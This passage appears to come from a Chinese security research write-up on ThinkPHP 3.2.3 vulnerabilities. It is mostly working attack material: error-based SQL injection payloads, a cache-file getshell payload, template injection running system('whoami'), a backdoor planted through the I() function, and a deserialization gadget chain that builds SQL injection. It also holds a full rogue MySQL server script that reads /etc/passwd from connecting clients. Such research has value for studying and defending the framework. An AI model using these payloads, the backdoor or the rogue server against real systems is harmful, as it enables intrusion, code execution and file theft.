        $table  =   $this->parseTable($options['table']);
        $sql    =   'DELETE FROM '.$table;
        if(strpos($table,',')){// 多表删除支持USING和JOIN操作
            if(!empty($options['using'])){
                $sql .= ' USING '.$this->parseTable($options['using']).' ';
            }
            $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');
        }
        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');
        if(!strpos($table,',')){
            // 单表删除支持order和limit
            $sql .= $this->parseOrder(!empty($options['order'])?$options['order']:'')
            .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');
        }
        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');
        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);
    }
```

1. find()

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user"); // 实例化User对象
        $name = I('GET.name');
        $User->find($name);
    }
}
```

`name[where]=updatexml(1,concat(0x7e,(select @@version),0x7e),1)%23`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201509038.png)

2. select()

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user"); // 实例化User对象
        $name = I('GET.name');
        $User->select($name);
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201511956.png)

3. delete()

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user"); // 实例化User对象
        $name = I('GET.name');
        $User->delete($name);
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201523742.png)

### order by注入

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user"); // 实例化User对象
        $order = I('GET.order');
        $res = $User->order($order)->find();
    }
}
```

thinkphp通过`__call`方法实现特殊方法

```php
    /**
     * 利用__call方法实现一些特殊的Model方法
     * @access public
     * @param string $method 方法名称
     * @param array $args 调用参数
     * @return mixed
     */
    public function __call($method,$args) {
        if(in_array(strtolower($method),$this->methods,true)) {
            // 连贯操作的实现
            $this->options[strtolower($method)] =   $args[0];
            return $this;
        }
        ...
    }
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201536130.png)

`$args[0]`没有经过任何过滤就被传入到`$this->options['order']`中,而同样在`parseOrder`中没有经过任何过滤就拼接到sql语句中

```php
    protected function parseOrder($order) {
        if(is_array($order)) {
            $array   =  array();
            foreach ($order as $key=>$val){
                if(is_numeric($key)) {
                    $array[] =  $this->parseKey($val);
                }else{
                    $array[] =  $this->parseKey($key).' '.$val;
                }
            }
            $order   =  implode(',',$array);
        }
        return !empty($order)?  ' ORDER BY '.$order:'';
    }
```

接下来的利用方法就跟前面提到的`find()`注入差不多

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201538087.png)

### group注入

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user"); // 实例化User对象
        $group = I('GET.group');
        $res = $User->group($group)->find();
    }
}
```

```php
    protected function parseGroup($group) {
        return !empty($group)? ' GROUP BY '.$group:'';
    }
```

利用方法同上

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203211302496.png)

### having注入

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user"); // 实例化User对象
        $having = I('GET.having');
        $res = $User->having($having)->find();
    }
}
```

```php
    protected function parseHaving($having) {
        return  !empty($having)?   ' HAVING '.$having:'';
    }
```

利用方法同上

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203211333888.png)

### count sum min max avg注入

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $User = M("user"); // 实例化User对象
        $count = I('GET.count');
        $res = $User->count($count);
    }
}
```

```php
    /**
     * 聚合查询
     * @access public
     * @param  string $aggregate    聚合方法
     * @param  string $field        字段名
     * @param  bool   $force        强制转为数字类型
     * @return mixed
     */
    public function aggregate($aggregate, $field, $force = false)
    {
        if (!preg_match('/^[\w\.\*]+$/', $field)) {
            throw new Exception('not support data:' . $field);
        }

        $result = $this->value($aggregate . '(' . $field . ') AS tp_' . strtolower($aggregate), 0, $force);

        return $result;
    }

    /**
     * COUNT查询
     * @access public
     * @param string $field 字段名
     * @return integer|string
     */
    public function count($field = '*')
    {
        if (isset($this->options['group'])) {
            if (!preg_match('/^[\w\.\*]+$/', $field)) {
                throw new Exception('not support data:' . $field);
            }
            // 支持GROUP
            $options = $this->getOptions();
            $subSql  = $this->options($options)->field('count(' . $field . ')')->bind($this->bind)->buildSql();

            $count = $this->table([$subSql => '_group_count_'])->value('COUNT(*) AS tp_count', 0);
        } else {
            $count = $this->aggregate('COUNT', $field);
        }

        return is_string($count) ? $count : (int) $count;

    }

    /**
     * SUM查询
     * @access public
     * @param string $field 字段名
     * @return float|int
     */
    public function sum($field)
    {
        return $this->aggregate('SUM', $field, true);
    }

    /**
     * MIN查询
     * @access public
     * @param string $field 字段名
     * @param bool   $force   强制转为数字类型
     * @return mixed
     */
    public function min($field, $force = true)
    {
        return $this->aggregate('MIN', $field, $force);
    }

    /**
     * MAX查询
     * @access public
     * @param string $field 字段名
     * @param bool   $force   强制转为数字类型
     * @return mixed
     */
    public function max($field, $force = true)
    {
        return $this->aggregate('MAX', $field, $force);
    }

    /**
     * AVG查询
     * @access public
     * @param string $field 字段名
     * @return float|int
     */
    public function avg($field)
    {
        return $this->aggregate('AVG', $field, true);
    }
```

没有经过过滤就拼接到sql语句中

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203211358033.png)

>除此之外还有不少sql注入同样是由于开发者错误的将用户传入的参数传递给thinkphp

[水文-Thinkphp3.2.3安全开发须知](https://xz.aliyun.com/t/2630)

## 缓存getshell

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $shell = I('GET.shell');
        S('shell',$shell);
    }
}
```

```php
#ThinkPHP/Common/functions.php
function S($name,$value='',$options=null) {
    static $cache   =   '';
    ...
    }elseif(empty($cache)) { // 自动初始化
        $cache      =   Think\Cache::getInstance();
    }
    ...
    else { // 缓存数据
        if(is_array($options)) {
            $expire     =   isset($options['expire'])?$options['expire']:NULL;
        }else{
            $expire     =   is_numeric($options)?$options:NULL;
        }
        return $cache->set($name, $value, $expire);//
    }
}
#ThinkPHP/Library/Think/Cache/Driver/File.class.php
//class File extends Cache
public function set($name,$value,$expire=null) {
    ...
    $filename   =   $this->filename($name);
    $data   =   serialize($value);
    if( C('DATA_CACHE_COMPRESS') && function_exists('gzcompress')) {
        //数据压缩
        $data   =   gzcompress($data,3);
    }
    $data    = "<?php\n//".sprintf('%012d',$expire).$check.$data."\n?>";
    $result  =   file_put_contents($filename,$data);
    ...
}
private function filename($name) {
    $name	=	md5(C('DATA_CACHE_KEY').$name);
    ...
    else{
        $filename	=	$this->options['prefix'].$name.'.php';
    }
    return $this->options['temp'].$filename;
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201611252.png)

文件名是`$name`的md5

写入的数据经过了序列化

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201612696.png)

最终文件路径为`./Application/Runtime/Temp/2591c98b70119fe624898b1e424b5e91.php`

```php
<?php
//000000000000s:4:"asdf";
?>
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201618008.png)

传入`shell=%0aphpinfo();//`

```php
<?php
//000000000000s:13:"
phpinfo();//";
?>
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201621681.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201621121.png)

## 特殊情况下造成命令执行

1. `$this->show`和`$this->display`

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $info = I('GET.info');
        $this->show($info);
        $this->display('','','',$info);
        $info = I('GET.info','','');#没有对<和>进行转义
        $this->show($info);
        $this->display('','','',$info);
    }
}
```

`info=<?php system('whoami');?>`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202114626.png)

在`Application/Runtime/Cache/Home`会生成对应的模板文件

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202115270.png)

2. `$this->fetch`

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $info = I('GET.info');
        $template=$this->fetch('',$info);
        var_dump($template);
        $info = I('GET.info','','');#没有对<和>进行转义
        $template=$this->fetch('',$info);
        var_dump($template);
    }
}
```

`info=<?php system('whoami');?>`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202120318.png)

在`Application/Runtime/Cache/Home`会生成对应的模板文件

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202120521.png)

3. 利用`I`函数留下后门

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        I('POST.info','',I('GET.info'));
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202146980.png)

## 反序列化sql注入/读取文件

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $s=I('POST.s');
        unserialize(base64_decode($s));
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222033257.png)

```php
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true//允许使用load data local
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "thinkphp_v3",
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "thinkphp_v3",
            "password" => "thinkphp_v3"
        );
    }
}
namespace Think {
    class Model
    {
        protected $db = null;
        protected $trueTableName='user';
        protected $pk = "id='abc' and updatexml(1,concat(0x7e,(select @@version),0x7e),1);#";

        public function __construct($db)
        {
            $this->db=$db;
        }
    }
}
namespace Think\Image\Driver {
    class Imagick
    {
        private $img;

        public function __construct($img)
        {
            $this->img = $img;
        }
    }
}

namespace Think\Session\Driver {
    class Memcache
    {
        protected $sessionName = '';
        protected $handle = null;

        public function __construct($sessionName, $handle)
        {
            $this->sessionName = $sessionName;
            $this->handle = $handle;
        }

    }
}


namespace {
    $db=new Think\Db\Driver\Mysql();
    $handle=new Think\Model($db);
    $sessionName="asdf";
    $memcache = new Think\Session\Driver\Memcache($sessionName,$handle);
    $s = new Think\Image\Driver\Imagick($memcache);
    var_dump($s);
    echo(base64_encode(serialize($s)));
}
```

[Mysql连接数据库时可读取文件](https://xz.aliyun.com/t/7169#toc-32)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222134687.png)

[利用脚本](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py)

>需要对这个脚本的`Server Greeting`进行一定的修改

```python
# -*- coding: UTF-8 -*-
import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers



PORT = 3306

log = logging.getLogger(__name__)

log.setLevel(logging.DEBUG)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = (
#    r'c:\boot.ini',
#    r'c:\windows\win.ini',
#    r'c:\windows\system32\drivers\etc\hosts',
   '/etc/passwd',
#    '/etc/shadow',
)


#================================================
#=======No need to change after this lines=======
#================================================

__author__ = 'Gifts'

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)


class LastPacket(Exception):
    pass


class OutOfOrder(Exception):
    pass


class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)


class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        # self.push(
        #     mysql_packet(
        #         0,
        #         "".join((
        #             '\x0a',  # Protocol
        #             '3.0.0-Evil_Mysql_Server' + '\0',  # Version
        #             #'5.1.66-0+squeeze1' + '\0',
        #             '\x36\x00\x00\x00',  # Thread ID
        #             'evilsalt' + '\0',  # Salt
        #             '\xdf\xf7',  # Capabilities
        #             '\x08',  # Collation
        #             '\x02\x00',  # Server Status
        #             '\0' * 13,  # Unknown
        #             'evil2222' + '\0',
        #         ))
        #     )
        # )
        # 这个Server Greeting太老了
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a',
                    '5.7.37-log' + '\0',
                    '\x02\x00\x00\x00',
                    '\x2b\x3a\x31\x7a\x22\x72\x64\x4f\x00',
                    '\xff\xf7',# 关闭ssl .... 0... .... .... = Switch to SSL after handshake: Not set
                    '\x2d',
                    '\x02\x00',
                    '\xff\xc1',
                    '\x15',
                    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                    '\x6b\x66\x64\x01\x4c\x1e\x0a\x5f\x79\x0d\x27\x5b\x00',
                    'mysql_native_password' + '\0',
                ))
            )
        )
        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('Query')

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == '\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    elif packet.payload == '\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)


z = mysql_listener()
daemonize()
asyncore.loop()
```

>不知道为啥,通过`mysql`手动连接可以复现,但在thinkphp里面没有复现出来...

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204231543156.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204231544750.png)

### __destruct方法

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204221947093.png)

```php
#ThinkPHP/Library/Think/Image/Driver/Imagick.class.php
<?php
namespace Think\Image\Driver;
use Think\Image;
class Imagick{
    /**
     * 图像资源对象
     * @var resource
     */
    private $img;

    /**
     * 图像信息，包括width,height,type,mime,size
     * @var array
     */
    private $info;

    /**
     * 析构方法，用于销毁图像资源
     */
    public function __destruct() {
        empty($this->img) || $this->img->destroy();
    }
}
```

通过`Think\Image\Driver\Imagick`的析构方法可以利用`$this->img->destroy()`对某个对象的`destroy`方法或者`__call`方法进行调用

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204221953929.png)

但是发现`__call`方法没有可以利用的点,即使部分`__call`方法中存在`call_user_func_array`,但存在判断条件如`method_exists`

### destroy方法

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222007548.png)

```php
#ThinkPHP/Library/Think/Session/Driver/Memcache.class.php
<?php
namespace Think\Session\Driver;

class Memcache {
	protected $lifeTime     = 3600;
	protected $sessionName  = '';
	protected $handle       = null;

    /**
     * 删除Session 
     * @access public 
     * @param string $sessID 
     */
	public function destroy($sessID) {
		return $this->handle->delete($this->sessionName.$sessID);
	}
}
```

1. `$this->handle->delete`调用某个对象的`delete`方法

2. `$this->sessionName.$sessID`调用某个对象的`__toString`方法,但是没有发现可以利用的点

### delete方法

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204222011716.png)

```php
#ThinkPHP/Library/Think/Model.class.php
<?php
namespace Think;
/**
 * ThinkPHP Model模型类
 * 实现了ORM和ActiveRecords模式
 */
class Model {
    // 当前数据库操作对象
    protected $db               =   null;#Think\Db\Driver\Mysql
    // 主键名称
    protected $pk               =   'id';
    // 实际数据表名（包含表前缀）
    protected $trueTableName    =   '';
    /**
     * 删除数据
     * @access public
     * @param mixed $options 表达式
     * @return mixed
     */
    public function delete($options=array()) {#由于$this->sessionName.$sessID因此$options必定为string类型
        $pk   =  $this->getPk();#$pk=$this->pk; 说明$pk可由用户输入控制
        ...
        if(is_numeric($options)  || is_string($options)) {
            // 根据主键删除记录
            if(strpos($options,',')) {
                $where[$pk]     =  array('IN', $options);
            }else{
                $where[$pk]     =  $options;
            }
            $options            =  array();
            $options['where']   =  $where;
        }
        ...
        // 分析表达式
        $options =  $this->_parseOptions($options);
        ...      
        if(is_array($options['where']) && isset($options['where'][$pk])){
            $pkValue            =  $options['where'][$pk];
        }
        ...
        $result  =    $this->db->delete($options);
        #进入sql语句执行,$this->db为数据库操作对象
        #使用Think\Db\Driver\Mysql来生成数据库操作对象
        #即$this->db设置为Think\Db\Driver\Mysql的对象
        if(false !== $result && is_numeric($result)) {
            $data = array();
            if(isset($pkValue)) $data[$pk]   =  $pkValue;
            $this->_after_delete($data,$options);
        }
        // 返回删除记录个数
        return $result;
    }

    /**
     * 分析表达式
     * @access protected
     * @param array $options 表达式参数
     * @return array
     */
    protected function _parseOptions($options=array()) {
        if(is_array($options))
            $options =  array_merge($this->options,$options);

        if(!isset($options['table'])){
            // 自动获取表名
            $options['table']   =   $this->getTableName();#$options['table']=$this->trueTableName 可控
            $fields             =   $this->fields;
        }else{
            // 指定数据表 则重新获取字段列表 但不支持类型检测
            $fields             =   $this->getDbFields();
        }
        ...
        // 记录操作的模型名称
        $options['model']       =   $this->name;
        ...
        // 查询过后清空sql表达式组装 避免影响下次查询
        $this->options  =   array();
        ...
        return $options;
    }
}
```

```php
#ThinkPHP/Library/Think/Db/Driver.class.php
    /**
     * 删除记录
     * @access public
     * @param array $options 表达式
     * @return false | integer
     */
    public function delete($options=array()) {
        $this->model  =   $options['model'];
        $this->parseBind(!empty($options['bind'])?$options['bind']:array());
        $table  =   $this->parseTable($options['table']);
        $sql    =   'DELETE FROM '.$table;
        ...
        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');
        if(!strpos($table,',')){
            // 单表删除支持order和limit
            $sql .= $this->parseOrder(!empty($options['order'])?$options['order']:'')
            .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');
        }
        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');
        #经过多个parse函数的分析后,最终生成的$sql为
        #DELETE FROM `user` WHERE id='abc' and updatexml(1,concat(0x7e,(select @@version),0x7e),1);# = 'Array'
        #因此最终在execute达成sql注入的目的
        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);
    }
```

通过反序列化进行数据库连接,同时通过可控的`$pk`参数构造sql注入